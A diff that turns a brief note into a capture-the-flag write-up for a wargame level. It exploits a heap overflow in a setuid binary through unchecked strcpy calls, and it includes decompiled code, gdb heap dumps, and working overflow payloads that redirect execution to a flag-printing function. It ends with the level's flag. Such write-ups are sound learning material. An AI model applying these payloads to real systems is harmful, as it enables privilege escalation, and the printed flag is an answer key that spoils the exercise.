@@ -1,13 +1,136 @@
+# Level 7
 
-heap:			0x804a008
-addr m(): 		0x080484f4
-addr puts@got.plt:	0x08049928 
+## General Informations 
 
-=> The buffers are adjacent
-=> The first strcpy allows us to overwrite the address of buff2 in buff3 with the address of puts@got.plt
-=> So buff3[1] = addr puts@got.plt
-=> Then the second strcpy will write from buff3[1] (puts@got.plt) and write the address of m() function
-=> When the puts() function will be called the m() function will be executed and print c (the flag)
+**Path** : `/home/user/level7/level7` </br>
+**File** : 
+```
+level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7`
 
-./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+## Static Analysis
 
+After decompiling the binary with ghidra we get the pseudo code below: 
+
+```
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+{
+  time_t tVar1;
+  
+  tVar1 = time((time_t *)0x0);
+  printf("%s - %d\n",c,tVar1);
+  return;
+}
+
+undefined4 main(undefined4 param_1,int param_2)
+{
+  undefined4 *puVar1;
+  void *pvVar2;
+  undefined4 *puVar3;
+  FILE *__stream;
+  
+  puVar1 = (undefined4 *)malloc(8);
+  *puVar1 = 1;
+  pvVar2 = malloc(8);
+  puVar1[1] = pvVar2;
+  puVar3 = (undefined4 *)malloc(8);
+  *puVar3 = 2;
+  pvVar2 = malloc(8);
+  puVar3[1] = pvVar2;
+  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
+  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
+  __stream = fopen("/home/user/level8/.pass","r");
+  fgets(c,0x44,__stream);
+  puts("~~");
+  return 0;
+}
+```
+
+- `main`
+    - Allocates 3 buffers of 8 bytes each.
+    - Sets the second element of the first buffer and the third buffer (`puVar1[1]/puVar3[1]`) to the address of the second buffer (`pvVar2`).
+    - `strcpy` is called twice and stores the first and second arguments into the heap. Because the buffers are adjacent, we should be able to overwrite the address of `puVar3[1]`.
+    - The flag (.pass) is read and stored in the symbol `c`.
+    - Then the `puts` function is called.
+- `m`, prints the current time and `c`.
+
+
+## Vulnerability found 
+
+The `strcpy` function does not verify the size of the user input, even if this size is greater than the destination buffer size. This allows us to overflow the buffer and overwrite data that follows the buffer in memory. </br>
+
+## Dynamic Analysis
+
+
+We put a breakpoint after the second `strcpy`:
+```
+(gdb) b *0x080485c2
+```
+
+Then we run the program with two basic arguments and we display the stack:
+```
+(gdb) r `AAAA` `BBBB`
+(gdb) x/16x 0x804a000
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
+0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
+```
+
+We see the address `0x0804a038` a few positions after the first argument `"AAAA"`. </br>
+Let's try to overwrite it with another address in the heap, like the next address `0x0804a03c`:
+```
+(gdb) r `python -c 'print "A"*20 + "\x3c\xa0\x04\x08"'` "BBBB"
+...
+Breakpoint 1, 0x080485c2 in main ()
+(gdb) x/16x 0x804a000
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x0804a03c
+0x804a030:	0x00000000	0x00000011	0x00000000	0x42424242
+```
+
+It works correctly! Then we can write an arbitrary address — let's try with the return address of main.
+
+To get the return address of main, we put a breakpoint at the end of the prologue of `main` and check the `ebp`.
+```
+(gdb) b *0x08048524
+(gdb) i r
+...
+ebp            0xbffff638	0xbffff638
+```
+The return address of main is `ebp + 4 = 0xbffff63c`. 
+
+Let's try to overwrite this address.
+```
+(gdb) r `python -c 'print "A"*20 + "\x3c\xf6\xff\xbf"'` "BBBB"
+...
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
+```
+
+If we try this payload in GDB, we get a `segfault` in the `fgets` function. That's because GDB tries to open a file it doesn't have permission to access. But outside of GDB, the program should work correctly.
+
+## Payload construction 
+
+We take our previous payload and write the address of `m` as the second argument. The address of `m` will replace the return address of main.
+```
+`python -c 'print "A"*20 + "\x3c\xf6\xff\xbf"'` `python -c 'print "\xf4\x84\x04\x08"'`
+```
+
+## Demonstration 
+
+```
+level7@RainFall:~$ ./level7 `python -c 'print "A"*20 + "\x3c\xf6\xff\xbf"'` `python -c 'print "\xf4\x84\x04\x08"'`
+~~
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1745151024
+Segmentation fault (core dumped)
+```
+
+## Flag 
+
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
